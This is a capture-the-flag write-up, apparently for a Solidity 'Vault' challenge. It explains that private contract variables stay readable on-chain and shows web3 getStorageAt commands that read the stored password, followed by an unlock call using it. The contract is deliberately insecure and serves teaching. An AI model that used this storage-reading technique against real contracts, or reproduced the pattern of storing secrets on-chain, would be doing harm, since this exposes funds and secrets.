# Description
Unlock the vault to pass the level!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

# Notes

- This challange depends on knowing what are private variables in solidity, how can they be private variables ? isn't the blockchain public and everyone can read it ?
- Private variables are only private for the smart contract scope which means they can't be accessed or modified from other smart contracts. But their values can be read freely outside the blockchain by anyone so they don't hide data in that sense.
- With that, the challenge becomes obvisou, and we can get the password.
- This contract uses 2 storage slots (each slot takes 32bytes), one for the `locked` variable and one for password `password`.
- We can for example read the `locked` variable which is in the storage slot index 0 like so :
```
await web3.eth.getStorageAt(contract.address, 0 , function(error, result){console.log(result)})
```
which returns
```
'0x0000000000000000000000000000000000000000000000000000000000000001'
```
(that's equivalant in bool to true)
- Like so we can read the password like so : 
```
await web3.eth.getStorageAt(contract.address, 1 , function(error, result){console.log(result)})
```
which returns : 
```
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
```
- Now we simply call the `unlock` method with the password :
```
await contract.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29)
```
and like that we have unlocked the vault, and we can check with the `locked` variable which is now false:
```
await web3.eth.getStorageAt(contract.address, 0 , function(error, result){console.log(result)})
```
which returns : `'0x0000000000000000000000000000000000000000000000000000000000000000'`
OR
```
await contract.locked()
```
which returns : `false`
